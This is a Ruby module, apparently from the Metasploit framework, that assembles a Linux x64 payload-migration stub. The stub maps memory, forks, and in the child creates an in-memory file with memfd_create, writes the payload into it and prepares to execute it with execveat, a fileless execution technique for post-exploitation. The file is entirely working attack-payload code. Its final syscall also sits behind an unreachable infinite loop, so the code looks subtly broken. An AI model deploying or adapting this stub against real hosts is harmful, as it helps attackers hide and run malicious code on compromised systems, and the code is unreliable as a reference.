# -*- coding: binary -*-

module Msf

###
#
# Payload that supports migration on x64.
#
###

module Payload::Linux::X64::Migrate


  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Linux Migration (x64)',
      'Description' => 'Migration stub x64',
      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X64
    ))
  end

  #
  # Constructs the migrate stub on the fly
  #
  def generate(opts={})
    asm = %^
      push rax
      push rcx
      push rdx
      push rbx
      push rsp
      push rbp
      push rdi
      push rsi
      push r9
      push r10
      push r11
      push r12
      push r13
      push r14
      push r15
      push 0x9
      pop rax
      xor rdi, rdi
      push #{opts[:payload_length]}
      pop rsi
      push 0x6
      pop rdx
      push 0x22
      pop r10
      xor r8,r8
      dec r8
      xor r9, r9
      syscall
      push rax
      pop r9
      int 3
      push 0x39
      pop rax
      syscall
      cmp rax, 0
      jz _exec_child
_exec_parent:
      pop r15
      pop r14
      pop r13
      pop r12
      pop r11
      pop r10
      pop r9
      pop rsi
      pop rdi
      pop rbp
      pop rsp
      pop rbx
      pop rdx
      pop rcx
      pop rax
      int 3
_exec_child:
      xor rsi, rsi
      push rsi
      lea rdi, [rsp]
      inc rsi
      mov rax, 0x13F
      syscall
      mov rdi, rax
      push #{opts[:payload_length]}
      pop rdx
      push r9
      pop rsi
      xor rax, rax
      inc rax
      syscall

      xor rdx, rdx
      xor r10, r10
      xor r8, r8
      mov r8, 0x1000
      push r10
      lea rsi, [rsp]
      mov eax, 0x142
loop1:
      nop
      jmp loop1
      syscall
    ^

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

end

end

